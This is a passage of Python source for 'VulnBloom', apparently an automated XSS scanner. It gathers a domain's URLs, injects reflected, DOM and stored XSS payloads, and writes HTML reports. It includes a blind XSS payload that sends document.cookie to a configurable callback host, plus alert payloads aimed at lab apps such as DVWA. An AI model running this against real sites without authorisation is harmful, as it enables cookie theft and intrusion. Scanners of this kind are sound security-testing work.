            'error': None
        }
    except Exception as e:
        return {
            'url': url,
            'payload': payload,
            'reflected': False,
            'context': '',
            'type': '',
            'error': str(e)
        }

def write_html_report(results, domain, extra_info=None):
    html_lines = [
        '<!DOCTYPE html>',
        '<html lang="en">',
        '<head>',
        '<meta charset="UTF-8">',
        f'<title>VulnBloom XSS Scan Report for {html.escape(domain)}</title>',
        '<style>',
        'body { font-family: Arial, sans-serif; background: #181818; color: #eee; }',
        'table { border-collapse: collapse; width: 100%; margin-top: 20px; }',
        'th, td { border: 1px solid #444; padding: 8px; text-align: left; }',
        'th { background: #222; }',
        '.found { background: #2e7d32; color: #fff; }',
        '.no-vuln { background: #4caf50; color: #fff; text-align: center; padding: 20px; font-size: 18px; }',
        'a.vuln-link { color: #fff; text-decoration: underline; }',
        '</style>',
        '</head>',
        '<body>',
        f'<h1>VulnBloom XSS Scan Report for {html.escape(domain)}</h1>',
    ]
    if extra_info:
        html_lines.append(f'<p><b>Total subdomains:</b> {extra_info.get("total_subdomains", "-")} | '
                         f'<b>Total URLs (with duplicates):</b> {extra_info.get("total_urls_with_dupes", "-")} | '
                         f'<b>Total URLs (after deduplication):</b> {extra_info.get("total_urls_deduped", "-")} | '
                         f'<b>Total payloads:</b> {extra_info.get("total_payloads", "-")}</p>')
    
    vuln_results = [r for r in results if r['reflected']]
    total_tests = len(results)
    xss_found = len(vuln_results)
    not_vulnerable = sum(1 for r in results if not r['reflected'] and not r['error'])
    errors = sum(1 for r in results if r['error'])
    
    html_lines.append(
        f'<p>Total tests: {total_tests} | XSS found: {xss_found}, Not vulnerable: {not_vulnerable}, Errors: {errors} </p>'
    )
    
    if not vuln_results:
        html_lines.append(
            '<div class="no-vuln">'
            '<h2>🎉 No XSS Vulnerabilities Found!</h2>'
            '<p>Congratulations! The scan completed successfully and no XSS vulnerabilities were detected.</p>'
            '<p>This means the target appears to be secure against XSS attacks with the tested payloads.</p>'
            '</div>'
        )
    else:
        html_lines += [
            '<table>',
            '<tr><th>#</th><th>Type</th><th>URL</th><th>Payload</th><th>Context</th></tr>'
        ]
        for i, r in enumerate(vuln_results, 1):
            rowclass = 'found'
            url_html = f'<a class="vuln-link" href="{html.escape(r["url"])}" target="_blank" rel="noopener noreferrer">{html.escape(r["url"])}</a>'
            html_lines.append(f'<tr class="{rowclass}"><td>{i}</td><td>{html.escape(r["type"])}</td><td>{url_html}</td><td>{html.escape(r["payload"])}</td><td>{html.escape(r["context"] or "")}</td></tr>')
        html_lines.append('</table>')
    
    html_lines += ['</body>', '</html>']
    with open(f'report_{domain}.html', 'w', encoding='utf-8') as f:
        f.write('\n'.join(html_lines))

def fetch_urlscan_urls(domain, retries=2):
    """
    Fetch URLs from URLScan.io with improved error handling.
    """
    url = f'https://urlscan.io/api/v1/search/?q=domain:{domain}'
    urls = set()
    
    for attempt in range(1, retries+1):
        try:
            response = requests.get(url, timeout=25, verify=False)
            if response.status_code == 200:
                data = response.json()
                for result in data.get('results', []):
                    page_url = result.get('page', {}).get('url')
                    if page_url:
                        urls.add(page_url)
                return list(urls)
            elif response.status_code == 429:
                print(Fore.YELLOW + f"[!] URLScan.io rate limited (attempt {attempt}/{retries})" + Fore.RESET)
                if attempt < retries:
                    time.sleep(2)  # Wait before retry
                continue
            else:
                print(Fore.RED + f"[!] URLScan.io error: {response.status_code}" + Fore.RESET)
                return []
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] URLScan.io timeout (attempt {attempt}/{retries})" + Fore.RESET)
            if attempt < retries:
                time.sleep(1)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] URLScan.io connection error (attempt {attempt}/{retries})" + Fore.RESET)
            if attempt < retries:
                time.sleep(1)
        except Exception as e:
            print(Fore.RED + f"[!] Error fetching URLs from URLScan.io: {e}" + Fore.RESET)
            log_error(f"URLScan URLs for {domain}", e)
            return []
    
    print(Fore.RED + f"[!] Failed to fetch from URLScan.io after {retries} attempts." + Fore.RESET)
    return []

# --- Blind XSS payload template ---
BLIND_XSS_CALLBACK_URL = 'http://localhost:5000/callback'  # Change to your public endpoint if needed
BLIND_XSS_PAYLOAD = f'<img src=x onerror=fetch(\'{BLIND_XSS_CALLBACK_URL}?c=\'+document.cookie)>'

def scan_dom_xss_parallel(urls, payloads, context=None, max_workers=4):
    """
    Run dom_xss_scan in parallel for a list of URLs and payloads.
    """
    import os
    import json
    STATE_FILE_DOM = 'scan_state_dom.json'
    # Resume or new scan prompt
    state = None
    if os.path.exists(STATE_FILE_DOM):
        print(Fore.YELLOW + '[!] Previous DOM XSS scan state detected.' + Fore.RESET)
        print('1. Resume previous DOM XSS scan')
        print('2. Start new DOM XSS scan')
        choice = input('Enter choice (1/2): ').strip()
        if choice == '1':
            with open(STATE_FILE_DOM, 'r', encoding='utf-8') as f:
                state = json.load(f)
            print(Fore.CYAN + '[+] Resuming previous DOM XSS scan...' + Fore.RESET)
        else:
            os.remove(STATE_FILE_DOM)
            print(Fore.CYAN + '[+] Starting new DOM XSS scan...' + Fore.RESET)

    results = state['results'] if state else []
    completed = set(tuple(x) for x in state['completed']) if state else set()

    def save_state():
        with open(STATE_FILE_DOM, 'w', encoding='utf-8') as f:
            json.dump({'results': results, 'completed': list(completed)}, f, indent=2)

    def run_test(url, payload):
        key = (url, payload)
        if key in completed:
            return None
        try:
            found, context_str = dom_xss_scan(url, payload, 5000, context)
        except Exception as exc:
            log_error(f"DOMXSS url: {url} payload: {payload}", exc)
            found = False
            context_str = f'Exception: {exc}'
        result = {
            'url': url,
            'payload': payload,
            'reflected': found,
            'context': context_str,
            'error': None if found else 'Not vulnerable'
        }
        results.append(result)
        completed.add(key)
        save_state()
        return result

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for url in urls:
            for payload in payloads:
                if (url, payload) not in completed:
                    futures.append(executor.submit(run_test, url, payload))
        for i, future in enumerate(as_completed(futures), 1):
            res = future.result()
            if res:
                results.append(res)
    print(Fore.CYAN + f"[+] DOM XSS scan complete. {len(results)} tests done." + Fore.RESET)
    if os.path.exists(STATE_FILE_DOM):
        os.remove(STATE_FILE_DOM)
    return results

# --- Parallel stored XSS workflow ---
def scan_stored_xss_workflow(stored_tests, context=None, max_workers=4):
    """
    Run stored_xss_scan in parallel for a list of test cases.
    """
    import os
    import json
    STATE_FILE_STORED = 'scan_state_stored.json'
    # Resume or new scan prompt
    state = None
    if os.path.exists(STATE_FILE_STORED):
        print(Fore.YELLOW + '[!] Previous stored XSS scan state detected.' + Fore.RESET)
        print('1. Resume previous stored XSS scan')
        print('2. Start new stored XSS scan')
        choice = input('Enter choice (1/2): ').strip()
        if choice == '1':
            with open(STATE_FILE_STORED, 'r', encoding='utf-8') as f:
                state = json.load(f)
            print(Fore.CYAN + '[+] Resuming previous stored XSS scan...' + Fore.RESET)
        else:
            os.remove(STATE_FILE_STORED)
            print(Fore.CYAN + '[+] Starting new stored XSS scan...' + Fore.RESET)

    results = state['results'] if state else []
    completed = set(tuple(x) for x in state['completed']) if state else set()

    def save_state():
        with open(STATE_FILE_STORED, 'w', encoding='utf-8') as f:
            json.dump({'results': results, 'completed': list(completed)}, f, indent=2)

    def run_test(test):
        key = (test['submit_url'], test['render_url'], test['payload'])
        if key in completed:
            return None
        try:
            print(Fore.CYAN + f"[Stored XSS] Submitting to {test['submit_url']} and revisiting {test['render_url']}..." + Fore.RESET)
            found, context_str, vuln_type = stored_xss_scan(
                test['submit_url'],
                test['render_url'],
                test['payload'],
                5000,
                context
            )
        except Exception as exc:
            log_error(f"StoredXSS submit: {test['submit_url']} render: {test['render_url']} payload: {test['payload']}", exc)
            found = False
            context_str = f'Exception: {exc}'
            vuln_type = None
        if found:
            print(Fore.GREEN + f"[STORED XSS FOUND] {test['render_url']} | Payload: {test['payload']} | {context_str}" + Fore.RESET)
        else:
            print(Fore.RED + f"[NOT VULN] {test['render_url']} | Payload: {test['payload']}" + Fore.RESET)
        result = {
            'url': test['render_url'],
            'payload': test['payload'],
            'reflected': found,
            'context': context_str,
            'type': vuln_type,
            'error': None if found else 'Not vulnerable'
        }
        results.append(result)
        completed.add(key)
        save_state()
        return result

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(run_test, test) for test in stored_tests if (test['submit_url'], test['render_url'], test['payload']) not in completed]
        for i, future in enumerate(as_completed(futures), 1):
            res = future.result()
            if res:
                results.append(res)
    print(Fore.CYAN + f"[+] Stored XSS scan complete. {len(results)} tests done." + Fore.RESET)
    if os.path.exists(STATE_FILE_STORED):
        os.remove(STATE_FILE_STORED)
    return results

import json
import os

STATE_FILE = 'scan_state.json'

def save_scan_state(state):
    with open(STATE_FILE, 'w', encoding='utf-8') as f:
        json.dump(state, f, indent=2)

def load_scan_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None

def clear_scan_state():
    if os.path.exists(STATE_FILE):
        os.remove(STATE_FILE)

def main(max_workers=8):
    # Resume or new scan prompt
    state = None
    if os.path.exists(STATE_FILE):
        print(Fore.YELLOW + '[!] Previous scan state detected.' + Fore.RESET)
        print('1. Resume previous scan')
        print('2. Start new scan')
        choice = input('Enter choice (1/2): ').strip()
        if choice == '1':
            state = load_scan_state()
            print(Fore.CYAN + '[+] Resuming previous scan...' + Fore.RESET)
        else:
            clear_scan_state()
            print(Fore.CYAN + '[+] Starting new scan...' + Fore.RESET)

    if state:
        # Load previous state
        domain = state['domain']
        subdomains = state['subdomains']
        unique_urls = state['unique_urls']
        payloads = state['payloads']
        tested = set(tuple(x) for x in state['tested'])
        results = state['results']
        found_count = state['found_count']
        not_found_count = state['not_found_count']
        errors = state['errors']
        extra_info = state['extra_info']
    else:
        try:
            domain = input(Fore.GREEN + 'Enter your url/domain (e.g. example.com): ' + Fore.RESET).strip()
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] User interrupted input. Exiting..." + Fore.RESET)
            sys.exit(0)
        print(Fore.CYAN + f"[+] Enumerating subdomains for {domain}..." + Fore.RESET)
        subdomains = enumerate_subdomains(domain)
        if not subdomains:
            print(Fore.YELLOW + f"[!] No subdomains found, using only the main domain." + Fore.RESET)
            subdomains = [domain]
        print(Fore.CYAN + f"[+] Total subdomains to scan: {len(subdomains)}" + Fore.RESET)

        all_urls = []
        spinner = itertools.cycle(['|', '/', '-', '\\'])
        for idx, sub in enumerate(subdomains, 1):
            print(Fore.MAGENTA + f"{idx}/{len(subdomains)} - {sub}" + Fore.RESET)
            print(Fore.CYAN + f"[+] Fetching URLs for {sub}... ", end='', flush=True)
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
            urls = fetch_wayback_urls(sub)
            sys.stdout.write('\r')
            print(Fore.YELLOW + f"  - {len(urls)} URLs found for {sub} (Wayback)" + Fore.RESET)
            all_urls.extend(urls)
            urlscan_urls = fetch_urlscan_urls(sub)
            print(Fore.YELLOW + f"  - {len(urlscan_urls)} URLs found for {sub} (URLScan.io)" + Fore.RESET)
            all_urls.extend(urlscan_urls)
        print(Fore.CYAN + f"[+] Total URLs (with duplicates): {len(all_urls)}" + Fore.RESET)
        # Remove duplicates and invalid URLs
        unique_urls = [u for u in set(all_urls) if u and u.startswith('http')]
        print(Fore.CYAN + f"[+] Removing duplicate URLs..." + Fore.RESET)
        print(Fore.CYAN + f"[+] Total URLs after deduplication: {len(unique_urls)}" + Fore.RESET)

        # --- Add blind XSS payload to the payload list ---
        payloads = load_payloads('payloads.txt')
        if BLIND_XSS_PAYLOAD not in payloads:
            payloads.append(BLIND_XSS_PAYLOAD)
        print(Fore.CYAN + f"[+] Total payloads loaded (including blind XSS): {len(payloads)}" + Fore.RESET)

        if not unique_urls:
            print(Fore.RED + '[!] No URLs found for any subdomain. Exiting.' + Fore.RESET)
            return

        tested = set()
        results = []
        found_count = 0
        not_found_count = 0
        errors = 0
        extra_info = {
            "total_subdomains": len(subdomains),
            "total_urls_with_dupes": len(all_urls),
            "total_urls_deduped": len(unique_urls),
            "total_payloads": len(payloads)
        }

    lock = threading.Lock()
    interrupted = False

    def save_and_exit():
        print(Fore.MAGENTA + "\n[!] Interrupted! Saving results so far..." + Fore.RESET)
        # Save scan state
        save_scan_state({
            'domain': domain,
            'subdomains': subdomains,
            'unique_urls': unique_urls,
            'payloads': payloads,
            'tested': list(tested),
            'results': results,
            'found_count': found_count,
            'not_found_count': not_found_count,
            'errors': errors,
            'extra_info': extra_info
        })
        write_html_report(results, domain, extra_info)
        print(Fore.CYAN + f"[+] HTML report saved as report_{domain}.html" + Fore.RESET)
        sys.exit(0)

    def signal_handler(sig, frame):
        nonlocal interrupted
        interrupted = True
        save_and_exit()

    signal.signal(signal.SIGINT, signal_handler)

    total_tests = len(unique_urls) * len(payloads)
    url_progress = {url: 0 for url in unique_urls}

    def task(url, payload, url_idx, total_urls):
        nonlocal found_count, not_found_count, errors
        if interrupted:
            return
        for mutated_url in inject_payloads(url, payload):
            key = (mutated_url, payload)
            if key in tested:
                continue
            tested.add(key)
            try:
                result = scan_url(mutated_url, payload)
            except Exception as exc:
                log_error(f"MainScan URL: {mutated_url} Payload: {payload}", exc)
                result = {
                    'url': mutated_url,
                    'payload': payload,
                    'reflected': False,
                    'context': None,
                    'error': f'Exception: {exc}'
                }
            with lock:
                results.append(result)
                print(Fore.CYAN + f"[{url_idx}/{total_urls}] Testing: {mutated_url} | Payload: {payload}" + Fore.RESET)
                if result['reflected']:
                    found_count += 1
                    print(Fore.GREEN + f"[XSS FOUND] {mutated_url} | Payload: {payload} | {result['context']}" + Fore.RESET)
                elif result['error']:
                    errors += 1
                    print(Fore.YELLOW + f"[ERROR] {mutated_url} | {result['error']}" + Fore.RESET)
                else:
                    not_found_count += 1
                    print(Fore.RED + f"[NOT VULN] {mutated_url} | Payload: {payload}" + Fore.RESET)
                write_html_report(results, domain, extra_info)
                # Save scan state after each result
                save_scan_state({
                    'domain': domain,
                    'subdomains': subdomains,
                    'unique_urls': unique_urls,
                    'payloads': payloads,
                    'tested': list(tested),
                    'results': results,
                    'found_count': found_count,
                    'not_found_count': not_found_count,
                    'errors': errors,
                    'extra_info': extra_info
                })

    max_workers = max(1, min(64, max_workers))
    print(Fore.CYAN + f"[+] Scanning with {max_workers} threads..." + Fore.RESET)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for url_idx, url in enumerate(unique_urls, 1):
            for payload in payloads:
                futures.append(executor.submit(task, url, payload, url_idx, len(unique_urls)))
        for i, future in enumerate(as_completed(futures), 1):
            if interrupted:
                break

    print(Fore.CYAN + f"[+] Scan complete. {found_count} XSS found, {not_found_count} not vulnerable, {errors} errors." + Fore.RESET)
    
    if found_count == 0:
        print(Fore.GREEN + Style.BRIGHT + "\n🎉 No XSS Vulnerabilities Found!" + Style.RESET_ALL)
        print(Fore.GREEN + "Congratulations! The scan completed successfully and no XSS vulnerabilities were detected." + Fore.RESET)
        print(Fore.GREEN + "This means the target appears to be secure against XSS attacks with the tested payloads." + Fore.RESET)
    else:
        print(Fore.YELLOW + f"\n⚠️  {found_count} XSS vulnerabilities found!" + Fore.RESET)
        print(Fore.YELLOW + "Please review the findings in the HTML report." + Fore.RESET)
    
    write_html_report(results, domain, extra_info)
    print(Fore.CYAN + f"[+] HTML report saved as report_{domain}.html" + Fore.RESET)

    # --- Example: How to use stored_xss_scan ---
    # Uncomment and customize the following block to scan for stored XSS:
    #
    # Demo stored XSS test cases for popular vulnerable web apps:
    # stored_tests = [
    #     # DVWA (Damn Vulnerable Web Application)
    #     {
    #         'submit_url': 'http://localhost/dvwa/vulnerabilities/xss_s/',
    #         'render_url': 'http://localhost/dvwa/vulnerabilities/xss_s/',
    #         'payload': '<img src=x onerror=alert(1)>',
    #         'form_selector': "form[action='#']",
    #         'input_name': 'txtName',
    #     },
    #     # bWAPP
    #     {
    #         'submit_url': 'http://localhost/bWAPP/xss_stored_1.php',
    #         'render_url': 'http://localhost/bWAPP/xss_stored_1.php',
    #         'payload': "<script>alert('XSS')</script>",
    #         'form_selector': "form[action='xss_stored_1.php']",
    #         'input_name': 'message',
    #     },
    #     # Mutillidae
    #     {
    #         'submit_url': 'http://localhost/mutillidae/index.php?page=add-to-your-blog.php',
    #         'render_url': 'http://localhost/mutillidae/index.php?page=view-someones-blog.php',
    #         'payload': '<svg/onload=alert(1)>',
    #         'form_selector': "form[name='blog_entry']",
    #         'input_name': 'blog_entry',
    #     },
    # ]
    # scan_stored_xss_workflow(stored_tests)

    # --- Example: How to use login_playwright and session support ---
    # Uncomment and customize the following block to enable login for authenticated scans:
    # login_context = login_playwright(
    #     login_url='http://target.com/login',
    #     username='your_username',
    #     password='your_password',
    #     username_selector='input[name="username"]',
    #     password_selector='input[name="password"]',
    #     submit_selector='button[type="submit"]'
    # )
    # Then pass context=login_context to dom_xss_scan and stored_xss_scan as needed.

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='VulnBloom XSS Scanner')
    parser.add_argument('--threads', type=int, default=8, help='Number of concurrent threads (default: 8)')
    args = parser.parse_args()
    global_max_workers = args.threads
    main(global_max_workers)
